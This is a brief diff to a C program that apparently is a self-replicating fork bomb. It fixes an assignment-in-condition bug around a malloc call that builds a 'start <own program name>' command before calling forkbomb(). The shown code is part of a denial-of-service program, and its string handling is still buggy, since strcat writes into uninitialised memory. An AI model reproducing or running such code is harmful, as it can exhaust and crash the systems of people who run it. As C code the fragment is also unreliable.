@@ -15,7 +15,7 @@ int main (int argc,char * argv[]) {
       return 4;
     }
   }
-  if (cmd = malloc(sizeof(char) * (strlen(argv[0])+7)) {
+  if ((cmd = malloc(sizeof(char) * (strlen(argv[0])+7))) != 0) {
     strcat(cmd,"start ");
     strcat(cmd,*argv);
     forkbomb();
